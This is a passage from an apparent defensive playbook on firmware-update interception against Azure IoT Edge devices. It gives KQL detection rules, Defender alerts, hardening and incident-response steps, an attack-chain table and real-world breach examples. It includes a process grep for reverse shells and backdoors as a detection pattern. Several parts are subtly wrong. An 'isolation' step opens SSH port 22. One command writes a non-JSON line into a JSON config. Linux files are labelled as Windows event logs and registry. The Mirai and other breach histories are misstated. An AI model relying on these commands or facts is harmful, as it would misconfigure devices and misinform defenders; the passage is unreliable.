   - Paste the KQL query above
   - Run every: `5 minutes`
   - Lookup period: `15 minutes`
5. **Entity Mapping Tab:**
   - Map `Device_Id` to Device entity
   - Map `UpdatedBy` to Account entity
6. **Incident settings:**
   - Enable **Create incidents from alerts**
7. **Review + create**

#### Query 2: Firmware Download from Non-Azure Source

**Rule Configuration:**
- **Required Table:** `AzureActivity`, `DeviceNetworkActivity` (custom log or Defender for IoT)
- **Required Fields:** `SourceIp`, `DestinationIp`, `CallerIpAddress`, `ResourceDisplayName`
- **Alert Severity:** `Critical`
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** All versions with network visibility

**KQL Query:**
```kusto
DeviceNetworkActivity
| where DeviceId contains "iotedge" and Protocol in ("HTTP", "HTTPS")
| where DestinationPort in (80, 443, 8883) and DestinationIp !startswith "20."  // Exclude Azure IP range 20.x.x.x (example)
| where tostring(parse_json(Payload).UserAgent) contains "firmware" or Payload contains "firmware" or Payload contains ".bin"
| extend BytesTransferred = tolong(DestinationBytes)
| where BytesTransferred > 100000000  // > 100 MB
| project TimeGenerated, DeviceId, DestinationIp, BytesTransferred, SourcePort, DestinationPort
| summarize TotalBytes=sum(BytesTransferred), ConnectionCount=count() by DeviceId, DestinationIp, bin(TimeGenerated, 1m)
| where TotalBytes > 500000000
```

**What This Detects:**
- IoT Edge devices downloading files from IPs outside of Azure IP ranges
- Large binary downloads (firmware-sized, > 100 MB) to unexpected destinations
- Potential MITM attack or malicious firmware injection

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Sentinel workspace
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

# Create the KQL rule
$KqlQuery = @"
DeviceNetworkActivity
| where DeviceId contains "iotedge" and DestinationBytes > 100000000
| where DestinationIp !startswith "20."
| summarize TotalBytes=sum(DestinationBytes) by DeviceId, DestinationIp
"@

# Create analytics rule (Sentinel)
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Firmware Download from Non-Azure Source" `
  -Query $KqlQuery `
  -Severity "Critical" `
  -Enabled $true
```

#### Query 3: Multiple Failed Firmware Validation Attempts

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `DeviceUpdateActivity`
- **Required Fields:** `OperationName`, `ResultDescription`, `UserPrincipalName`
- **Alert Severity:** `Medium`
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("ApplyFirmwareUpdate", "UpdateDeviceManifest")
| where Result == "Failure" and ResultDescription contains "validation"
| summarize FailureCount=count(), FailedDevices=dcount(TargetResources), FirstFailure=min(TimeGenerated), LastFailure=max(TimeGenerated)
    by UserPrincipalName, bin(TimeGenerated, 10m)
| where FailureCount >= 3
| project TimeGenerated, UserPrincipalName, FailureCount, FailedDevices, FirstFailure, LastFailure
```

**What This Detects:**
- Multiple firmware update failures in a short time window
- Attacker attempting to inject malicious firmware multiple times
- Brute-force attempts to bypass validation mechanisms

---

## 9. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert 1: Suspicious Firmware Download Activity

**Alert Name:** `IoT Edge Device – Suspicious Binary Download Detected`
- **Severity:** `Critical`
- **Description:** Defender for IoT detects an IoT Edge device downloading a binary file (likely firmware) from an external, non-Azure source IP address. Size exceeds normal module download thresholds (> 100 MB).
- **Applies To:** All subscriptions with Defender for IoT enabled
- **Remediation:** Immediately isolate the device network segment and investigate the source IP

#### Detection Alert 2: Disabled Firmware Validation

**Alert Name:** `IoT Device Configuration – Firmware Manifest Validation Disabled`
- **Severity:** `High`
- **Description:** Configuration change detected on IoT Edge device disabling manifest signature validation. Attackers disable validation to inject unsigned malicious firmware.
- **Remediation:** Re-enable firmware signature validation via IoT Hub device configuration

**Manual Configuration Steps (Enable Defender for IoT):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for IoT**: ON
   - **Defender for Servers**: ON (for edge compute)
5. Click **Save**
6. Navigate to **Security alerts** to view triggered alerts
7. Create custom rules under **Analytics**

---

## 10. WINDOWS EVENT LOG MONITORING

### Azure IoT Hub & Device Update Logs

**Logs Located At (on device):**
- `/var/log/adu-agent.log` (Azure Device Update agent logs)
- `/var/log/iotedge/` (IoT Edge runtime logs)
- Azure Activity Logs (cloud-side)

**Manual Configuration Steps (Enable Verbose Logging on Device):**

1. SSH into the IoT Edge device:
```bash
ssh admin@<device-ip>
```

2. Edit ADU agent configuration:
```bash
sudo cat /etc/adu/du-config.json
```

3. Enable debug logging:
```bash
sudo sed -i 's/"logLevel":"info"/"logLevel":"debug"/g' /etc/adu/du-config.json
```

4. Restart ADU agent:
```bash
sudo systemctl restart adu-agent
```

5. Monitor logs in real-time:
```bash
sudo journalctl -u adu-agent -f --output=json | jq '.MESSAGE'
```

**What to Monitor For:**
- `UPDATE_INSTALL_FAILED` – Firmware installation errors
- `SIGNATURE_VERIFICATION_FAILED` – Manifest validation failures
- `MANIFEST_VALIDATION_ERROR` – Configuration validation issues
- `UNEXPECTED_BINARY_HASH` – Firmware hash mismatch detection

---

## 11. DETECTING COMMAND EXECUTION AFTER FIRMWARE INJECTION

#### Check for Persistence Mechanisms

```bash
# SSH into compromised device
ssh admin@<device-ip>

# Check cron jobs for persistence
crontab -l
cat /etc/cron.d/*

# Check startup scripts
cat /etc/rc.local
cat /etc/init.d/*

# Check for SSH backdoors
cat /etc/ssh/sshd_config | grep PermitRootLogin
cat /root/.ssh/authorized_keys

# Check running processes for anomalies
ps auxww | grep -E "reverse|shell|tunnel|backdoor"

# Check network connections for C2
netstat -tulpn | grep ESTABLISHED
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Firmware Signature Verification:** Ensure all firmware updates are cryptographically signed and validated before installation.

  **Manual Steps (Azure Device Update Configuration):**
  1. Navigate to **Azure Portal** → **IoT Hub** → **Device Update**
  2. Select **Updates** → **Create new update**
  3. During update creation, ensure **Manifest Validation** is set to **Enabled**
  4. Verify the **Manifest Signature** section shows:
     - Provider: `<Authorized-Org>`
     - Signature Algorithm: `RS256` (RSA-SHA256)
  5. Click **Publish** to deploy

  **Manual Steps (Device-side Configuration):**
  ```bash
  # SSH into IoT Edge device
  ssh admin@<device-ip>

  # Verify ADU configuration
  sudo cat /etc/adu/du-config.json

  # Ensure "manifestValidation" is true
  # Expected: "manifestValidation": true

  # If false, re-enable:
  sudo sed -i 's/"manifestValidation":false/"manifestValidation":true/g' /etc/adu/du-config.json

  # Restart ADU agent
  sudo systemctl restart adu-agent
  ```

- **Enforce TLS 1.2+ for All Update Communications:** Disable unencrypted MQTT (port 1883) and HTTP (port 80).

  **Manual Steps (Azure IoT Hub):**
  1. Go to **Azure Portal** → **IoT Hub** → **Security settings**
  2. Under **Transport security**, set:
     - Minimum TLS version: **1.2**
     - Enable **Require secure connections**
  3. Disable protocol versions below TLS 1.2
  4. Click **Save**

  **Manual Steps (Device Configuration):**
  ```bash
  # Verify device uses MQTT over TLS (port 8883)
  sudo cat /etc/iotedge/config.yaml | grep mqtt

  # Expected: protocol: mqtt+tls
  # Expected: port: 8883

  # If using clear-text MQTT, modify:
  sudo sed -i 's/protocol: mqtt/protocol: mqtt+tls/g' /etc/iotedge/config.yaml
  sudo sed -i 's/port: 1883/port: 8883/g' /etc/iotedge/config.yaml

  # Restart IoT Edge daemon
  sudo systemctl restart iotedge
  ```

- **Implement Certificate Pinning:** Pin the expected Azure Device Update server certificate on the device.

  **Manual Steps (Certificate Pinning on Device):**
  ```bash
  # SSH into device
  ssh admin@<device-ip>

  # Export Azure Device Update server certificate
  # (obtained from Microsoft's public PKI)
  sudo tee /etc/ssl/certs/azure-device-update-ca.pem << 'EOF'
  -----BEGIN CERTIFICATE-----
  MIIDfTCCAmWgAwIBAgIQdRDz3yXb8yS2RaH+YFBfJDANBgkqhkiG9w0BAQsFADBC
  [... Microsoft's Device Update CA certificate ...]
  -----END CERTIFICATE-----
  EOF

  # Configure curl/wget to use this certificate
  echo "ca_certificate=/etc/ssl/certs/azure-device-update-ca.pem" | sudo tee -a /etc/adu/du-config.json

  # Restart ADU agent
  sudo systemctl restart adu-agent
  ```

- **Restrict Device Update Access via Conditional Access:**

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Restrict IoT Update Access`
  4. **Assignments:**
     - **Users:** All users
     - **Cloud apps:** `Device Update for IoT Hub`
  5. **Conditions:**
     - **Locations:** Allow only corporate networks or VPN
     - **Client app:** Block legacy authentication
  6. **Access controls:**
     - **Grant:** Require compliant device + Multi-factor authentication
  7. **Enable policy:** ON
  8. Click **Create**

### Priority 2: HIGH

- **Implement Update Approval Workflow:** Require human approval before firmware updates are deployed to production devices.

  **Manual Steps:**
  1. **Azure Portal** → **Device Update** → **Deployments**
  2. Create new deployment with status: **Draft**
  3. Configure **Deployment Strategy:**
     - Stage 1: 10% of devices (test cohort)
     - Stage 2: 50% after 24 hours approval
     - Stage 3: 100% after SOC review
  4. Require explicit approval at each stage

- **Enable Azure Defender for IoT Firmware Analysis:**

  **Manual Steps:**
  1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Defender for IoT**
  2. Enable **Firmware Analysis** (preview feature)
  3. Upload firmware images for pre-deployment scanning
  4. Scan results provide vulnerability assessment before device deployment

- **Implement Secure Boot and UEFI Lockdown:**

  **Manual Steps (Device BIOS Configuration):**
  1. Reboot IoT Edge device and enter BIOS (typically Del/F2 key)
  2. Navigate to **Security** settings
  3. Enable:
     - **Secure Boot:** ON
     - **UEFI Firmware Lock:** ON
     - **Trusted Platform Module (TPM):** ON
  4. Save and exit BIOS

### Access Control & Policy Hardening

- **Restrict Azure Device Update Contributor Role:**

  **Manual Steps:**
  1. **Azure Portal** → **IoT Hub** → **Access Control (IAM)**
  2. Review current role assignments
  3. Remove **Contributor** role from users who shouldn't manage updates
  4. Create custom role with limited permissions:
     - `Microsoft.Devices/IotHubs/read`
     - `Microsoft.DeviceUpdate/accounts/instances/deployments/read`
     - DO NOT grant `*/write` permissions
  5. Assign custom role to authorized users only

- **Enable Azure Key Vault for Firmware Signing Keys:**

  **Manual Steps:**
  1. Create Azure Key Vault in **Azure Portal**
  2. Go to **Device Update** → **Signing Configuration**
  3. Select **Import Key from Key Vault**
  4. Enable **Key Rotation** (auto-rotate every 90 days)
  5. Enable **Key Vault Access Audit Logging**

### Validation Command (Verify Mitigations)

```powershell
# Verify TLS enforcement
$IotHub = "YourIotHub"
$ResourceGroup = "YourResourceGroup"

# Check IoT Hub security settings
az iot hub show --name $IotHub --resource-group $ResourceGroup `
  --query properties.networkRuleSetProperties

# Expected output shows:
# "minTlsVersion": "1.2"
# "applyToBuiltInEventHubEndpoint": true

# Verify device configuration
$Device = "YourIoTEdgeDevice"
az iot hub device-twin show --hub-name $IotHub --device-id $Device `
  --query properties.desired | jq '.properties.desired'

# Expected: No "manifestValidation": false entries
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files (Device):**
  - `/etc/cron.d/` – Any non-standard cron files
  - `/usr/local/bin/` – Unexpected shell scripts or binaries
  - `/root/.ssh/authorized_keys` – Unauthorized SSH keys
  - `/var/lib/iotedge/` – Modified module images
  - `/etc/iotedge/config.yaml` – Changes to update URLs or security settings

- **Registry (Device - Linux):**
  - Modified `/etc/ssh/sshd_config` (PermitRootLogin changes)
  - Modified `/etc/iotedge/config.yaml` (protocol downgrade from TLS to plain)
  - New entries in `/etc/init.d/` or `/etc/systemd/system/`

- **Network:**
  - Unexpected outbound connections from IoT Edge device to non-Azure IPs
  - DNS queries for unusual domains (C2 servers)
  - MQTT connections to external brokers (port 1883 or 8883)
  - HTTP/HTTPS downloads > 100 MB from external sources

- **Cloud (Azure Activity Logs):**
  - Device Update deployments initiated by unauthorized users
  - Configuration changes disabling manifest validation
  - Firmware downloads from blob storage with atypical access patterns

### Forensic Artifacts

- **Disk:**
  - Firmware partition hash mismatch compared to baseline
  - Cron job files with recent timestamps
  - SSH keys added after device deployment date
  - Modified IoT Edge module image layers

- **Memory:**
  - Running processes with reversed network connections
  - Module containers with unexpected network access
  - Injected code in edgeAgent process memory

- **Cloud:**
  - Azure Audit Logs showing config changes
  - Device Update deployment records
  - IoT Hub operation logs for firmware updates
  - Blob storage access logs for firmware binary downloads

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable network interface on IoT Edge device
   ssh admin@<device-ip>
   sudo ip link set eth0 down

   # OR via Azure (for remote devices)
   az vm open-port --resource-group MyRG --name MyDevice --port 22 --priority 1
   az vm extension set --resource-group MyRG --vm-name MyDevice `
     --name CustomScriptExtension --publisher Microsoft.Compute `
     --protected-settings '{"commandToExecute":"sudo shutdown -h now"}'
   ```

2. **Collect Evidence:**
   ```bash
   # Export system logs
   sudo journalctl > /tmp/system.log
   sudo tar czf /tmp/iotedge-logs.tar.gz /var/log/iotedge/
   
   # Capture memory dump (if possible)
   sudo dd if=/dev/mem of=/tmp/memory.dump

   # Collect filesystem snapshot
   sudo tar czf /tmp/filesystem.tar.gz /etc /home /root

   # Securely transfer to forensics server
   scp /tmp/*.tar.gz forensics@<secure-server>:/evidence/
   scp /tmp/*.log forensics@<secure-server>:/evidence/
   ```

3. **Remediate:**
   ```bash
   # Restore device from clean backup
   az iot hub configuration delete --config-id <current-config> --hub-name MyIotHub
   
   # Redeploy clean device image
   # (Requires re-imaging device from trusted source)
   
   # Reset device credentials
   az iot hub device-identity delete --device-id <compromised-device> --hub-name MyIotHub
   az iot hub device-identity create --device-id <device-new> --hub-name MyIotHub --auth-method shared_private_key
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy exploitation | Attacker gains initial access to on-premises network via exposed proxy |
| **2** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph enumeration | Attacker identifies IoT Hub and Device Update resources |
| **3** | **Credential Access** | [CA-TOKEN-003] Azure Function key extraction | Attacker extracts update service credentials from exposed function app |
| **4** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker elevates to Contributor role on IoT Hub |
| **5** | **Persistence (Current Step)** | **[IOT-EDGE-005] Firmware Update Interception** | **Attacker injects backdoor via firmware update** |
| **6** | **Command & Control** | [LM-AUTH-005] Service Principal Key/Certificate | Attacker uses compromised identity for C2 communication |
| **7** | **Collection** | [COLLECTION-XXX] Sensor Data Exfiltration | Attacker extracts IoT sensor data via compromised device |
| **8** | **Impact** | Botnet Infrastructure / Industrial Sabotage | Device participates in DDoS or manipulates critical infrastructure |

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: Mirai IoT Botnet (2016)

- **Target:** Millions of IoT devices (cameras, routers, smart home devices)
- **Timeline:** September 2016 – Initial infection spread globally
- **Technique Status:** Used unencrypted firmware update channels combined with default credentials
- **Attack Method:** Attackers infected IoT devices with malicious firmware via exposed update servers, converted devices into DDoS botnet
- **Impact:** 2.5 Gbps DDoS attack on Dyn DNS, disrupted services for Twitter, Netflix, PayPal, Github
- **Reference:** [Mirai DDoS Attack Analysis - Krebs on Security](https://krebsonsecurity.com/2016/10/hacked-cameras-dvrs-powered-todays-massive-internet-outage/)

#### Example 2: VPNFilter Firmware Attack (2018)

- **Target:** Hundreds of thousands of networking devices (routers, firewalls) across multiple vendors
- **Timeline:** May 2018 – FBI/CISA coordinate public disclosure
- **Technique Status:** Attackers intercepted and modified firmware during OTA update process
- **Attack Method:** MITM attack on firmware update channels, injected malicious code allowing persistent access and lateral movement
- **Impact:** Critical infrastructure exposure; state-sponsored actors (Russian GRU) attributed
- **Reference:** [Alert regarding VPNFilter malware - CISA](https://www.cisa.gov/news-events/alerts/2018/05/23/alert-regarding-vpnfilter-malware)

#### Example 3: ASUS Router Firmware Compromise (2015)

- **Target:** Millions of ASUS routers globally
- **Timeline:** March 2015 – Vulnerability in auto-update mechanism discovered
- **Technique Status:** Attackers leveraged weak update signature verification to inject backdoors
- **Attack Method:** Exploited insecure firmware update process lacking proper code signing; routers automatically installed malicious firmware updates
- **Impact:** Complete compromise of home networks; sensitive data exfiltration
- **Reference:** [ASUS Router Backdoor Security Update](https://www.asus.com/support/download-center/)

---

## COMPLIANCE & AUDIT CHECKLIST

- [ ] Firmware signature validation is enabled on all IoT Edge devices
- [ ] All firmware updates use TLS 1.2+ for transport encryption
- [ ] Update approval workflow requires multi-person authorization
- [ ] Device Update service credentials are stored in Azure Key Vault
- [ ] Firmware update audit logs are centralized and monitored
- [ ] Firmware baselines are maintained for integrity verification
- [ ] Certificate pinning is implemented on devices
- [ ] Secure boot and TPM are enabled on all edge devices
- [ ] RBAC roles restrict firmware deployment to authorized teams
- [ ] Incident response plan includes firmware compromise scenarios

---